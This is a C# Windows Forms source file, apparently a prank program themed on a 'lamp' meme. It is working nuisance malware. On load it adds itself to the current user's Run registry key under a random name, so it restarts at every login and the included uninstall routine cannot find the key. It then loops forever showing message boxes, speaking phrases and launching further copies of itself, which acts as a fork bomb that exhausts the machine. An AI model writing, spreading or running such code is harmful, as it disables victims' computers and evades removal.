using System;
using System.IO;
using System.Windows.Forms;
using System.Speech.Synthesis;

namespace SuperHax
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        //Random Key Generator
        public static string Key()
        {
            String randomString = Path.GetRandomFileName();
            randomString = randomString.Replace(".", string.Empty);
            return randomString;
        }

        public void StartupInstall()
        {
            //Adds program to startup through registry based on current runtime directory
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(Key(), Application.ExecutablePath);
        }

        public void StartupUninstall()
        {
            //removes program to startup through registry based on current runtime directory
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue("INSERT YOUR KEY HERE", false);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Phrase array
            string[] Phrases = new string[4];
            Phrases[0] = "Lamp";
            Phrases[1] = "replace lamp";
            Phrases[2] = "need light";
            Phrases[3] = "Why do you deny me light";

            //Creating new speach synthesizer
            SpeechSynthesizer synth = new SpeechSynthesizer();
            //Setting output to default audio device
            synth.SetOutputToDefaultAudioDevice();

            //Calling Install function, change to StartupUninstall() to remove program on startup and clear registry from key
            StartupInstall();

            //infinite loop
            while (true)
            {
                //Displaying Message
                MessageBox.Show("Please Give me lomp","Where is mein lomp?",MessageBoxButtons.YesNo,MessageBoxIcon.Question);

                //Generating Random number in order to pick from array
                Random rnd = new Random();
                int Number = rnd.Next(0,4);
                //Using previosly premade synth object and picking phrase from array to say using generated random number
                synth.Speak(Phrases[Number]);
                //Getting applications live executable path and running it in command prompt to launch another thread
                System.Diagnostics.Process.Start(Application.ExecutablePath);
            }
        }
    }
}
